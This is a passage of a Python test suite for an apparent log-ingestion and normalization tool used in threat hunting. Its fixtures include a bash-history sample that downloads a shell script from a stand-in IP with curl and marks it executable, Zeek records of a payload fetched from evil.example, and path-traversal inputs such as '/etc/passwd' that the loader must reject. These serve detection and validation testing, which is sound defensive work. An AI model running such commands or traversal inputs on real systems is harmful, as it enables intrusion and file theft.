"""Unit & integration tests for Milestone M2 (F02 RawEvidenceStore & F03 Normalizer)."""

from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path
from typing import Any

import pytest

from apt_agent.exceptions import InvalidArgumentError, OutOfScopeError
from apt_agent.ingestion import (
    NormalizationResult,
    Normalizer,
    RawEvidenceStore,
    detect_indexed_log_format,
    event_to_parsed_dict,
    format_for_chainsaw,
    format_for_hayabusa,
    format_for_rsigma,
    format_for_zircolite,
    ingest_records,
    load_indexed_records,
    load_label_index,
)
from apt_agent.models import Event, Locator, RawRecord, RunContext


def _ctx(case_id: str = "case-m2", run_id: str = "run-m2") -> RunContext:
    return RunContext(case_id=case_id, run_id=run_id)


# ---------------------------------------------------------------------------
# F02: ingest_records & RawEvidenceStore
# ---------------------------------------------------------------------------


def test_ingest_records_single_pass_replay_and_isolation() -> None:
    consumed = 0

    def _gen():
        nonlocal consumed
        for pid, payload in [
            ("pr-1", {"msg": "first", "nested": {"tags": ["a"]}}),
            ("pr-2", {"msg": "second", "nested": {"tags": ["b"]}}),
        ]:
            consumed += 1
            yield (pid, payload)

    gen = _gen()
    loc_map = {"pr-1": Locator(filepath="data/H1/ecar.json", linenumber=1)}
    store = ingest_records(
        gen,
        case_id="case-1",
        run_id="run-1",
        locator_map=loc_map,
    )

    assert consumed == 2
    assert list(gen) == []  # generator exhausted in single pass
    assert len(store) == 2
    assert "pr-1" in store
    assert "pr-missing" not in store
    assert store.physical_ids() == ["pr-1", "pr-2"]
    assert store.physical_id_frozenset() == frozenset({"pr-1", "pr-2"})

    # Mutating caller's locator_map after ingestion does not affect store
    loc_map["pr-2"] = Locator(filepath="data/H1/other.json", linenumber=99)
    assert store.get_locator("pr-1") == Locator(filepath="data/H1/ecar.json", linenumber=1)
    assert store.get_locator("pr-2") is None

    # Replayable across multiple iterations and getters
    first_pass = [r.physical_record_id for r in store]
    second_pass = [r.physical_record_id for r in store.iter_records()]
    assert first_pass == second_pass == ["pr-1", "pr-2"]

    rec1 = store.get("pr-1")
    assert rec1 is not None
    assert rec1.raw_id == "pr-1"
    assert store.get_by_raw_id("pr-1") == rec1
    assert rec1.source_hint == "data/H1/ecar.json"
    assert rec1.content_digest and len(rec1.content_digest) == 64

    # Mutating returned payload does not corrupt internal store
    rec1.payload["nested"]["tags"].append("mutated")
    rec1_again = store.get("pr-1")
    assert rec1_again is not None
    assert rec1_again.payload["nested"]["tags"] == ["a"]


def test_ingest_records_empty_stream_and_fetch_raw_evidence() -> None:
    store = ingest_records(iter(()), case_id="case-empty", run_id="run-empty")
    assert len(store) == 0
    assert store.records() == []
    assert store.fetch_raw_evidence([]) == ([], [])
    assert store.fetch_raw_evidence(["pr-1", "pr-1"]) == ([], ["pr-1"])
    assert store.summary() == {
        "case_id": "case-empty",
        "run_id": "run-empty",
        "record_count": 0,
        "has_scope_filter": False,
    }


def test_ingest_records_input_isolation_and_error_cases() -> None:
    payload = {"nested": [1, 2]}
    store = ingest_records([("pr-1", payload)], case_id="c1", run_id="r1")
    payload["nested"].append(999)
    rec = store.get("pr-1")
    assert rec is not None
    assert rec.payload == {"nested": [1, 2]}

    with pytest.raises(InvalidArgumentError):
        ingest_records("not-a-stream", case_id="c1", run_id="r1")  # type: ignore[arg-type]
    with pytest.raises(InvalidArgumentError):
        ingest_records({"pr-1": {}}, case_id="c1", run_id="r1")  # type: ignore[arg-type]
    with pytest.raises(InvalidArgumentError):
        ingest_records(None, case_id="c1", run_id="r1")  # type: ignore[arg-type]
    with pytest.raises(InvalidArgumentError):
        ingest_records([("pr-1",)], case_id="c1", run_id="r1")  # type: ignore[list-item]
    with pytest.raises(InvalidArgumentError):
        ingest_records([("   ", {})], case_id="c1", run_id="r1")
    with pytest.raises(InvalidArgumentError):
        ingest_records([("pr-1", "not-dict")], case_id="c1", run_id="r1")  # type: ignore[list-item]
    with pytest.raises(InvalidArgumentError):
        ingest_records([("pr-1", {"a": 1}), ("pr-1", {"a": 2})], case_id="c1", run_id="r1")
    with pytest.raises(InvalidArgumentError):
        ingest_records([], case_id=" ", run_id="r1")
    with pytest.raises(InvalidArgumentError):
        ingest_records([], case_id="c1", run_id="r1", locator_map={" ": Locator(filepath="a", linenumber=1)})
    with pytest.raises(InvalidArgumentError):
        ingest_records([], case_id="c1", run_id="r1", valid_physical_ids={"pr-1", " "})

    # Scope enforcement
    with pytest.raises(OutOfScopeError):
        ingest_records(
            [("pr-1", {"a": 1}), ("pr-outside", {"a": 2})],
            case_id="c1",
            run_id="r1",
            valid_physical_ids={"pr-1"},
        )


def test_fetch_raw_evidence_dedup_missing_and_validation() -> None:
    store = ingest_records(
        [("pr-1", {"v": 1}), ("pr-2", {"v": 2}), ("pr-3", {"v": 3})],
        case_id="c1",
        run_id="r1",
    )
    found, missing = store.fetch_raw_evidence(["pr-3", "pr-miss-1", "pr-1", "pr-3", "pr-miss-1"])
    assert [r.physical_record_id for r in found] == ["pr-3", "pr-1"]
    assert missing == ["pr-miss-1"]

    # Returned records are isolated copies
    found[0].payload["v"] = 999
    assert store.get("pr-3").payload["v"] == 3  # type: ignore[union-attr]

    with pytest.raises(InvalidArgumentError):
        store.fetch_raw_evidence("pr-1")  # type: ignore[arg-type]
    with pytest.raises(InvalidArgumentError):
        store.fetch_raw_evidence(["pr-1", "  "])
    with pytest.raises(InvalidArgumentError):
        store.get("  ")


# ---------------------------------------------------------------------------
# F02: Label_Index.json & Multi-format Extraction (Interface §1.2 & §7.1)
# ---------------------------------------------------------------------------


def test_label_index_multiformat_s71_and_edge_cases(tmp_path: Path) -> None:
    data_dir = tmp_path / "data"
    (data_dir / "H1" / "bash_history").mkdir(parents=True)
    (data_dir / "SENSOR-NET-01").mkdir(parents=True)

    # 1. JSONL with blank line 1, valid dict line 2, non-dict JSON line 3, malformed line 4
    ecar_file = data_dir / "H1" / "ecar.json"
    ecar_file.write_text(
        "\n"
        + json.dumps({"id": "e2", "object": "PROCESS", "action": "CREATE", "timestamp_ms": 1717063203000})
        + "\n"
        + "[1, 2, 3]\n"
        + "{bad json\n",
        encoding="utf-8",
    )

    # 2. Multiline XML with XML comment containing fake <Event> and nested <EventData>/<EventID>
    xml_file = data_dir / "H1" / "windows_event_sysmon.xml"
    xml_file.write_text(
        """<Events>
  <!-- <Event><System><EventID>999</EventID></System></Event> -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon"/>
      <EventID>1</EventID>
      <TimeCreated SystemTime="2024-05-30T10:00:01.1234567Z"/>
      <EventRecordID>101</EventRecordID>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WKS-01</Computer>
    </System>
    <EventData>
      <Data Name="Image">C:\\Windows\\System32\\cmd.exe</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon"/>
      <EventID>3</EventID>
      <TimeCreated SystemTime="2024-05-30T10:00:02.0000000Z"/>
      <EventRecordID>102</EventRecordID>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WKS-01</Computer>
    </System>
    <EventData>
      <Data Name="DestinationIp">203.0.113.8</Data>
    </EventData>
  </Event>
</Events>
""",
        encoding="utf-8",
    )

    # 3. bash_history with preamble before first marker and multiline 2nd command
    bash_file = data_dir / "H1" / "bash_history" / "alice.bash_history"
    bash_file.write_text(
        "echo preamble\n"
        "#1717063200\n"
        "whoami\n"
        "#1717063210\n"
        "cat <<'EOF' > /tmp/x\n"
        "hello\n"
        "EOF\n",
        encoding="utf-8",
    )

    # 4. bash_history without markers -> non-blank line grouping
    bash_nomark = data_dir / "H1" / "bash_history" / "bob.bash_history"
    bash_nomark.write_text("\nid\n\nuname -a\n", encoding="utf-8")

    # 5. syslog & web_access
    syslog_file = data_dir / "H1" / "syslog.log"
    syslog_file.write_text(
        "<34>1 2024-05-30T10:00:01Z host1 app 10 - - first\n"
        "<34>1 2024-05-30T10:00:02Z host1 app 11 - - second\r\n",
        encoding="utf-8",
    )

    index_path = tmp_path / "Label_Index.json"
    index_data = {
        "pr-jsonl-blank": {"filepath": "data/H1/ecar.json", "linenumber": 1},
        "pr-jsonl-2": {"filepath": "data/H1/ecar.json", "linenumber": 2},
        "pr-jsonl-nondict": {"filepath": "data/H1/ecar.json", "linenumber": 3},
        "pr-xml-2": {"filepath": "data/H1/windows_event_sysmon.xml", "linenumber": 2},
        "pr-bash-1": {"filepath": "data/H1/bash_history/alice.bash_history", "linenumber": 1},
        "pr-bash-2": {"filepath": "data/H1/bash_history/alice.bash_history", "linenumber": 2},
        "pr-bash-nomark-2": {"filepath": "data/H1/bash_history/bob.bash_history", "linenumber": 2},
        "pr-syslog-2": {"filepath": "data/H1/syslog.log", "linenumber": 2},
    }
    index_path.write_text(json.dumps(index_data), encoding="utf-8")

    assert detect_indexed_log_format("data/H1/ecar.json") == "jsonl"
    assert detect_indexed_log_format("data/H1/windows_event_sysmon.xml") == "winxml"
    assert detect_indexed_log_format("data/H1/bash_history/alice.bash_history") == "bash_history"
    assert detect_indexed_log_format("data/H1/syslog.log") == "text"

    loc_map = load_label_index(index_path, data_dir=data_dir)
    assert set(loc_map.keys()) == set(index_data.keys())

    # strict_json=True fails when reading ecar.json containing malformed line 4
    with pytest.raises(InvalidArgumentError):
        list(load_indexed_records(index_path, data_dir, strict_json=True))

    # strict_json=False succeeds and preserves exact S7.1 semantics
    rows = list(load_indexed_records(index_path, data_dir, strict_json=False))
    by_id = dict(rows)
    assert [pid for pid, _ in rows] == list(index_data.keys())
    assert by_id["pr-jsonl-blank"] == {"raw_text": ""}
    assert by_id["pr-jsonl-2"]["id"] == "e2"
    assert by_id["pr-jsonl-nondict"] == {"raw_text": "[1, 2, 3]", "json_value": [1, 2, 3]}
    assert "<EventRecordID>102</EventRecordID>" in by_id["pr-xml-2"]["raw_text"]
    assert "<EventID>999</EventID>" not in by_id["pr-xml-2"]["raw_text"]
    assert by_id["pr-bash-1"] == {"raw_text": "echo preamble\nwhoami", "timestamp": 1717063200}
    assert by_id["pr-bash-2"] == {
        "raw_text": "cat <<'EOF' > /tmp/x\nhello\nEOF",
        "timestamp": 1717063210,
    }
    assert by_id["pr-bash-nomark-2"] == {"raw_text": "uname -a", "timestamp": None}
    assert by_id["pr-syslog-2"] == {
        "raw_text": "<34>1 2024-05-30T10:00:02Z host1 app 11 - - second"
    }


def test_label_index_security_and_validation_errors(tmp_path: Path) -> None:
    data_dir = tmp_path / "data"
    data_dir.mkdir()
    outside = tmp_path / "secret.txt"
    outside.write_text("secret\n", encoding="utf-8")
    (data_dir / "ok.log").write_text("line1\n", encoding="utf-8")

    # Symlink escape inside data_dir pointing outside data_dir
    escape_link = data_dir / "escape.log"
    os.symlink(outside, escape_link)

    def _write_idx(obj: Any) -> Path:
        p = tmp_path / "idx.json"
        p.write_text(json.dumps(obj), encoding="utf-8")
        return p

    # Path traversal & escape errors -> OutOfScopeError
    for bad_path in (
        "data/../secret.txt",
        "../secret.txt",
        "/etc/passwd",
        "C:\\Windows\\win.ini",
        "data\\H1\\ok.log",
        "data/ok.log\x00.json",
        "data/escape.log",
    ):
        idx = _write_idx({"pr-1": {"filepath": bad_path, "linenumber": 1}})
        with pytest.raises(OutOfScopeError):
            load_label_index(idx, data_dir=data_dir)

    # Invalid pr- IDs and invalid linenumbers -> InvalidArgumentError
    for bad_id in ("evt-1", "pr-", "pr- 1", "123"):
        idx = _write_idx({bad_id: {"filepath": "data/ok.log", "linenumber": 1}})
        with pytest.raises(InvalidArgumentError):
            load_label_index(idx, data_dir=data_dir)

    for bad_ln in (True, False, 0, -1, "1", 1.5, None):
        idx = _write_idx({"pr-1": {"filepath": "data/ok.log", "linenumber": bad_ln}})
        with pytest.raises(InvalidArgumentError):
            load_label_index(idx, data_dir=data_dir)

    # Out-of-range linenumber -> InvalidArgumentError
    idx_oor = _write_idx({"pr-1": {"filepath": "data/ok.log", "linenumber": 5}})
    with pytest.raises(InvalidArgumentError):
        list(load_indexed_records(idx_oor, data_dir))

    # Missing file -> InvalidArgumentError
    idx_missing = _write_idx({"pr-1": {"filepath": "data/missing.log", "linenumber": 1}})
    with pytest.raises(InvalidArgumentError):
        list(load_indexed_records(idx_missing, data_dir))


# ---------------------------------------------------------------------------
# F03: Normalizer across 6 formats / 16 log types + Formatter Bridges
# ---------------------------------------------------------------------------


def _sample_records_16_types() -> list[tuple[str, dict[str, Any], Locator, str]]:
    """Return (pid, payload, locator, expected_source_type) for all 16 log types."""
    sysmon_xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "<System>"
        '<Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>'
        "<EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task>"
        "<Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords>"
        '<TimeCreated SystemTime="2024-05-30T10:00:01.1234567Z"/>'
        "<EventRecordID>101</EventRecordID>"
        "<Channel>Microsoft-Windows-Sysmon/Operational</Channel>"
        "<Computer>WKS-01</Computer>"
        '<Security UserID="S-1-5-18"/>'
        "</System>"
        "<EventData>"
        '<Data Name="Image">C:\\Windows\\System32\\powershell.exe</Data>'
        '<Data Name="CommandLine">powershell.exe -nop</Data>'
        '<Data Name="ParentImage">C:\\Program Files\\WINWORD.EXE</Data>'
        "</EventData>"
        "</Event>"
    )
    security_xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "<System>"
        '<Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>'
        "<EventID>4624</EventID><Version>2</Version><Level>0</Level><Task>12544</Task>"
        "<Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords>"
        '<TimeCreated SystemTime="2024-05-30T18:00:02.0000000+08:00"/>'
        "<EventRecordID>202</EventRecordID>"
        "<Channel>Security</Channel>"
        "<Computer>DC-01</Computer>"
        "</System>"
        "<EventData>"
        '<Data Name="TargetUserName">alice</Data>'
        '<Data Name="LogonType">10</Data>'
        "</EventData>"
        "</Event>"
    )
    return [
        (
            "pr-sysmon",
            {"raw_text": sysmon_xml},
            Locator(filepath="data/WKS-01/windows_event_sysmon.xml", linenumber=1),
            "winxml_sysmon",
        ),
        (
            "pr-security",
            {"raw_text": security_xml},
            Locator(filepath="data/DC-01/windows_event_security.xml", linenumber=1),
            "winxml_security",
        ),
        (
            "pr-zeek-conn",
            {
                "ts": 1717063203.0,
                "uid": "C1",
                "id.orig_h": "10.0.1.8",
                "id.orig_p": 51030,
                "id.resp_h": "203.0.113.8",
                "id.resp_p": 443,
                "proto": "tcp",
                "conn_state": "SF",
            },
            Locator(filepath="data/SENSOR-NET-01/conn.json", linenumber=1),
            "zeek_conn",
        ),
        (
            "pr-zeek-dhcp",
            {
                "ts": 1717063204.0,
                "uids": ["D1"],
                "mac": "00:11:22:33:44:55",
                "assigned_addr": "10.0.1.8",
                "lease_time": 3600.0,
            },
            Locator(filepath="data/SENSOR-NET-01/dhcp.json", linenumber=1),
            "zeek_dhcp",
        ),
        (
            "pr-zeek-dns",
            {
                "ts": 1717063205.0,
                "uid": "N1",
                "id.orig_h": "10.0.1.8",
                "id.resp_h": "10.0.0.2",
                "query": "evil.example",
                "qtype_name": "A",
                "answers": ["203.0.113.8"],
            },
            Locator(filepath="data/SENSOR-NET-01/dns.json", linenumber=1),
            "zeek_dns",
        ),
        (
            "pr-zeek-files",
            {
                "ts": 1717063206.0,
                "fuid": "F1",
                "mime_type": "application/x-dosexec",
                "sha256": "deadbeef",
            },
            Locator(filepath="data/SENSOR-NET-01/files.json", linenumber=1),
            "zeek_files",
        ),
        (
            "pr-zeek-http",
            {
                "ts": 1717063207.0,
                "uid": "H1",
                "id.orig_h": "10.0.1.8",
                "id.resp_h": "203.0.113.8",
                "method": "GET",
                "host": "evil.example",
                "uri": "/payload.exe",
                "status_code": 200,
            },
            Locator(filepath="data/SENSOR-NET-01/http.json", linenumber=1),
            "zeek_http",
        ),
        (
            "pr-zeek-ocsp",
            {
                "ts": 1717063208.0,
                "file_id": "O1",
                "certStatus": "good",
                "serialNumber": "1234",
            },
            Locator(filepath="data/SENSOR-NET-01/ocsp.json", linenumber=1),
            "zeek_ocsp",
        ),
        (
            "pr-zeek-pe",
            {
                "ts": 1717063209.0,
                "id": "P1",
                "machine": "AMD64",
                "section_names": [".text", ".rdata"],
            },
            Locator(filepath="data/SENSOR-NET-01/pe.json", linenumber=1),
            "zeek_pe",
        ),
        (
            "pr-zeek-smtp",
            {
                "ts": 1717063210.0,
                "uid": "M1",
                "id.orig_h": "10.0.1.20",
                "helo": "mail.example",
                "mailfrom": "attacker@example.net",
            },
            Locator(filepath="data/SENSOR-NET-01/smtp.json", linenumber=1),
            "zeek_smtp",
        ),
        (
            "pr-zeek-ssl",
            {
                "ts": 1717063211.0,
                "uid": "S1",
                "id.orig_h": "10.0.1.8",
                "id.resp_h": "203.0.113.8",
                "server_name": "evil.example",
                "cipher": "TLS_AES_128_GCM_SHA256",
            },
            Locator(filepath="data/SENSOR-NET-01/ssl.json", linenumber=1),
            "zeek_ssl",
        ),
        (
            "pr-zeek-x509",
            {
                "ts": 1717063212.0,
                "fingerprint": "abcd",
                "certificate.subject": "CN=evil.example",
            },
            Locator(filepath="data/SENSOR-NET-01/x509.json", linenumber=1),
            "zeek_x509",
        ),
        (
            "pr-ecar",
            {
                "id": "ecar-1",
                "object": "PROCESS",
                "action": "CREATE",
                "hostname": "WKS-01",
                "principal": "DOMAIN\\alice",
                "pid": 4242,
                "ppid": 1100,
                "timestamp_ms": 1717063213000,
                "properties": {"image_path": "C:\\cmd.exe", "command_line": "cmd /c whoami"},
            },
            Locator(filepath="data/WKS-01/ecar.json", linenumber=1),
            "ecar",
        ),
        (
            "pr-syslog",
            {
                "raw_text": "<34>1 2024-05-30T10:00:14Z APP-LNX-02 sshd 2211 ID42 - Accepted publickey for alice"
            },
            Locator(filepath="data/APP-LNX-02/syslog.log", linenumber=1),
            "syslog",
        ),
        (
            "pr-web",
            {
                "raw_text": '198.51.100.10 - - [30/May/2024:10:00:15 +0000] "GET /login HTTP/1.1" 200 512 "-" "curl/8.5"'
            },
            Locator(filepath="data/WEB-01/web_access.log", linenumber=1),
            "web_access",
        ),
        (
            "pr-bash",
            {"raw_text": "curl -s http://203.0.113.8/p.sh\nchmod +x p.sh", "timestamp": 1717063216},
            Locator(filepath="data/APP-LNX-02/bash_history/alice.bash_history", linenumber=1),
            "bash_history",
        ),
    ]


@pytest.mark.parametrize("with_locator", [True, False])
def test_normalizer_all_16_log_types_with_and_without_locator(with_locator: bool) -> None:
    samples = _sample_records_16_types()
    locator_map = {pid: loc for pid, _, loc, _ in samples} if with_locator else None
    store = ingest_records(
        ((pid, payload) for pid, payload, _, _ in samples),
        case_id="case-16",
        run_id="run-16",
        locator_map=locator_map,
    )
    ctx = _ctx(case_id="case-16", run_id="run-16")

    # Both Normalizer.normalize_batch and Normalizer().normalize_batch work
    res1 = Normalizer.normalize_batch(ctx, store)
    res2 = Normalizer().normalize_batch(ctx, store)
    assert isinstance(res1, NormalizationResult)
    assert res1.gaps == []
    assert len(res1.events) == 16
    assert [e.event_id for e in res1.events] == [e.event_id for e in res2.events]
    assert "apt_agent.ingestion._log_convert_lib" in sys.modules

    expected_types = {pid: st for pid, _, _, st in samples}
    for ev in res1.events:
        assert ev.raw_id == ev.physical_record_id
        assert res1.event_to_physical[ev.event_id] == ev.physical_record_id
        assert ev.source_type == expected_types[ev.physical_record_id]
        assert ev.event_time is not None and ev.event_time.endswith("Z")

    assert len(res1.source_type_counts) == 16
    assert sum(res1.source_type_counts.values()) == 16


def test_normalizer_cross_case_id_isolation_and_multievent_xml() -> None:
    multi_xml = (
        "<Events>"
        "<Event><System><Provider Name='Microsoft-Windows-Sysmon'/><EventID>1</EventID>"
        "<TimeCreated SystemTime='2024-05-30T10:00:01Z'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel>"
        "<Computer>WKS-01</Computer></System><EventData><Data Name='Image'>a.exe</Data></EventData></Event>"
        "<Event><System><Provider Name='Microsoft-Windows-Sysmon'/><EventID>3</EventID>"
        "<TimeCreated SystemTime='2024-05-30T10:00:02Z'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel>"
        "<Computer>WKS-01</Computer></System><EventData><Data Name='DestinationIp'>1.2.3.4</Data></EventData></Event>"
        "</Events>"
    )
    raw = RawRecord(physical_record_id="pr-multi", payload={"raw_text": multi_xml})

    out_a = Normalizer.normalize(_ctx(case_id="case-A"), raw)
    out_b = Normalizer().normalize(_ctx(case_id="case-B"), raw)

    assert len(out_a["events"]) == 2
    assert len(out_b["events"]) == 2
    assert out_a["events"][0].event_id != out_a["events"][1].event_id
    assert out_a["events"][0].event_id != out_b["events"][0].event_id
    assert all(ev.raw_id == "pr-multi" for ev in out_a["events"])


def test_normalizer_timestamps_unknown_fields_and_gaps_p1() -> None:
    records = [
        # 1. Naive timestamp + unknown fields + explicit None in ECAR
        (
            "pr-ecar-naive",
            {
                "id": "e1",
                "object": "PROCESS",
                "action": "CREATE",
                "hostname": "WKS-01",
                "principal": None,
                "timestamp": "2024-05-30T10:00:00",  # naive!
                "custom_vendor_tag": "xyz-123",
                "properties": {"image_path": "cmd.exe", "custom_prop": 42},
            },
        ),
        # 2. RFC 3164 syslog (no year / timezone)
        (
            "pr-syslog-3164",
            {"raw_text": "<34>May 30 10:00:04 linux-01 sshd[99]: Failed password"},
        ),
        # 3. Unknown Sysmon System tag
        (
            "pr-winxml-extra",
            {
                "raw_text": (
                    "<Event><System><Provider Name='Microsoft-Windows-Sysmon'/>"
                    "<EventID>1</EventID><CustomSystemTag>custom_val</CustomSystemTag>"
                    "<TimeCreated SystemTime='2024-05-30T18:00:00+08:00'/>"
                    "<Channel>Microsoft-Windows-Sysmon/Operational</Channel></System>"
                    "<EventData><Data Name='Image'>cmd.exe</Data></EventData></Event>"
                )
            },
        ),
        # 4. Bash history without timestamp (markerless)
        (
            "pr-bash-notime",
            {"raw_text": "id", "timestamp": None},
        ),
        # 5. Unparseable corrupt record -> gap while RawRecord stays queryable in store (P1)
        (
            "pr-corrupt",
            {"raw_text": "<<<NOT_A_VALID_LOG_AT_ALL>>>"},
        ),
    ]
    store = ingest_records(records, case_id="c-p1", run_id="r-p1")
    res = Normalizer.normalize_batch(_ctx(case_id="c-p1", run_id="r-p1"), store)

    by_pid = {ev.physical_record_id: ev for ev in res.events}

    # ECAR naive timestamp -> event_time=None + warning, unknown & None fields kept
    ecar_ev = by_pid["pr-ecar-naive"]
    assert ecar_ev.event_time is None
    assert "unknown_timezone" in ecar_ev.parse_metadata["warnings"]
    assert ecar_ev.fields["principal"] is None
    assert ecar_ev.fields["custom_vendor_tag"] == "xyz-123"
    assert ecar_ev.fields["properties_custom_prop"] == 42
    assert "custom_vendor_tag" in ecar_ev.parse_metadata["unknown_fields"]

    # RFC 3164 -> event_time=None + warning, fields parsed
    sys_ev = by_pid["pr-syslog-3164"]
    assert sys_ev.event_time is None
    assert "rfc3164_missing_year_and_timezone" in sys_ev.parse_metadata["warnings"]
    assert sys_ev.fields["rfc"] == "3164"

    # WinXML +08:00 -> UTC Z, original timezone and unknown System tag preserved
    win_ev = by_pid["pr-winxml-extra"]
    assert win_ev.event_time == "2024-05-30T10:00:00Z"
    assert win_ev.parse_metadata["original_timezone"] == "+08:00"
    assert win_ev.fields["CustomSystemTag"] == "custom_val"

    # Bash without timestamp
    bash_ev = by_pid["pr-bash-notime"]
    assert bash_ev.event_time is None
    assert bash_ev.fields["Image"] == "id"

    # Corrupt record -> gap entry, RawRecord still retrievable via fetch_raw_evidence
    assert "pr-corrupt" not in by_pid
    assert len(res.gaps) == 1
    assert res.gaps[0]["physical_record_id"] == "pr-corrupt"
    assert res.gaps[0]["raw_id"] == "pr-corrupt"
    found, missing = store.fetch_raw_evidence(["pr-corrupt"])
    assert len(found) == 1 and missing == []
    assert found[0].payload["raw_text"] == "<<<NOT_A_VALID_LOG_AT_ALL>>>"


def test_formatter_bridges_for_m3() -> None:
    samples = _sample_records_16_types()
    store = ingest_records(
        ((pid, payload) for pid, payload, _, _ in samples),
        case_id="case-fmt",
        run_id="run-fmt",
        locator_map={pid: loc for pid, _, loc, _ in samples},
    )
    ctx = _ctx(case_id="case-fmt", run_id="run-fmt")
    batch = Normalizer.normalize_batch(ctx, store)

    # Also include an untimestamped event to verify RSigma sorting places missing timestamps last
    untimed = Event(
        event_id="evt_untimed",
        physical_record_id="pr-untimed",
        source_type="bash_history",
        event_time=None,
        fields={"log_source": "bash_history", "epoch_ts": None, "User": "bob", "Image": "id", "command": "id"},
        parse_metadata={"log_format": "bash_history"},
    )
    all_events = [*batch.events, untimed]

    # 1. Zircolite
    z_recs = format_for_zircolite(batch.events)
    assert len(z_recs) == 16
    for zr, ev in zip(z_recs, batch.events):
        assert zr["event_id"] == ev.event_id
        assert zr["raw_id"] == ev.physical_record_id
        # Lists flattened to scalar strings for SQLite
        if zr.get("log_source") == "zeek" and "answers" in zr:
            assert isinstance(zr["answers"], str)

    # 2. Hayabusa (winxml only + reverse index)
    h_recs, h_idx = format_for_hayabusa(all_events)
    assert len(h_recs) == 2
    assert len(h_idx) == 2
    assert h_recs[0]["RecordNumber"] == 101
    assert h_idx[0]["RecordID"] == 101
    assert h_idx[0]["Computer"] == "WKS-01"
    assert h_idx[0]["event_id"] == h_recs[0]["event_id"]
    assert h_idx[0]["raw_id"] == "pr-sysmon"

    # 3. RSigma (UTC ascending, missing timestamps last, native lists preserved)
    r_recs = format_for_rsigma(all_events, sort_utc=True)
    assert len(r_recs) == 17
    assert r_recs[-1]["event_id"] == "evt_untimed"
    timed_ts = [r["@timestamp"] for r in r_recs[:-1]]
    assert timed_ts == sorted(timed_ts)
    dns_rec = next(r for r in r_recs if r.get("zeek_log_type") == "dns")
    assert isinstance(dns_rec["answers"], list)

    # 4. Chainsaw
    c_recs = format_for_chainsaw(batch.events)
    assert len(c_recs) == 16
    win_c = next(r for r in c_recs if "Event" in r)
    assert isinstance(win_c["Event"]["System"]["Provider"], str)
    assert "Provider_attributes" in win_c["Event"]["System"]
    assert win_c["raw_id"] == "pr-sysmon"
    non_win_c = [r for r in c_recs if "Event" not in r]
    assert all("timestamp" in r for r in non_win_c)

    # event_to_parsed_dict works on manually constructed Events too
    parsed = event_to_parsed_dict(untimed)
    assert parsed["event_id"] == "evt_untimed"
    assert parsed["raw_id"] == "pr-untimed"


def test_normalizer_sys_modules_lib_and_sys_path_isolation() -> None:
    code = (
        "import sys; "
        "before_path = list(sys.path); "
        "from apt_agent.ingestion import Normalizer; "
        "from apt_agent.models import RawRecord, RunContext; "
        "ctx = RunContext(case_id='c', run_id='r'); "
        "raw = RawRecord(physical_record_id='pr-1', payload={'raw_text': 'curl -s x', 'timestamp': 1717063200}); "
        "out = Normalizer.normalize(ctx, raw); "
        "assert len(out['events']) == 1; "
        "assert 'lib' not in sys.modules; "
        "assert 'apt_agent.ingestion._log_convert_lib' in sys.modules; "
        "assert sys.path == before_path"
    )
    subprocess.run([sys.executable, "-c", code], check=True, timeout=20)


# ---------------------------------------------------------------------------
# Regression tests for M2 Verifier Findings (Iteration 2)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("bad_props", [["bad"], "corrupt", 123])
def test_ecar_malformed_properties_handled_and_formatters_safe(bad_props: Any) -> None:
    ctx = _ctx(case_id="case-ecar-badprops", run_id="run-1")
    raw = RawRecord(
        physical_record_id="pr-badprops",
        payload={
            "id": "e-bad",
            "object": "PROCESS",
            "action": "CREATE",
            "hostname": "WKS-01",
            "timestamp_ms": 1717063200000,
            "properties": bad_props,
        },
    )
    out = Normalizer.normalize(ctx, raw)
    assert out["gaps"] == []
    assert len(out["events"]) == 1
    ev = out["events"][0]
    assert ev.source_type == "ecar"
    assert "invalid_properties" in ev.parse_metadata["warnings"]
    assert ev.fields["properties"] == bad_props

    # Downstream formatters must not crash on either normalized or manually constructed Events
    assert len(format_for_zircolite([ev])) == 1
    assert len(format_for_rsigma([ev])) == 1
    assert len(format_for_chainsaw([ev])) == 1

    manual_ev = Event(
        event_id="evt_manual_badprops",
        physical_record_id="pr-manual",
        source_type="ecar",
        event_time="2024-05-30T10:00:00Z",
        fields={"object": "PROCESS", "action": "CREATE", "properties": bad_props},
        parse_metadata={"log_format": "ecar_json", "_ecar_raw": {"properties": bad_props}},
    )
    assert len(format_for_zircolite([manual_ev])) == 1
    assert len(format_for_rsigma([manual_ev])) == 1
    assert len(format_for_chainsaw([manual_ev])) == 1


@pytest.mark.parametrize("bad_bytes", ["abc", "N/A"])
def test_web_access_non_numeric_bytes_handled(bad_bytes: str) -> None:
    ctx = _ctx(case_id="case-web-badbytes", run_id="run-1")
    raw = RawRecord(
        physical_record_id="pr-badbytes",
        payload={
            "raw_text": (
                f'10.0.0.1 - - [30/May/2024:16:07:22 +0000] "GET / HTTP/1.1" 200 {bad_bytes}'
            )
        },
    )
    out = Normalizer.normalize(ctx, raw)
    assert out["gaps"] == []
    assert len(out["events"]) == 1
    ev = out["events"][0]
    assert ev.source_type == "web_access"
    assert ev.fields["sc-bytes"] is None
    assert ev.fields["sc-status"] == 200
    assert "invalid_bytes" in ev.parse_metadata["warnings"]
    assert len(format_for_zircolite([ev])) == 1


def test_format_for_rsigma_subsecond_utc_sort() -> None:
    ctx = _ctx(case_id="case-sort", run_id="run-1")
    ev_later = Normalizer.normalize(
        ctx, RawRecord(physical_record_id="pr-later", payload={"ts": 1717063200.5, "conn_state": "SF"})
    )["events"][0]
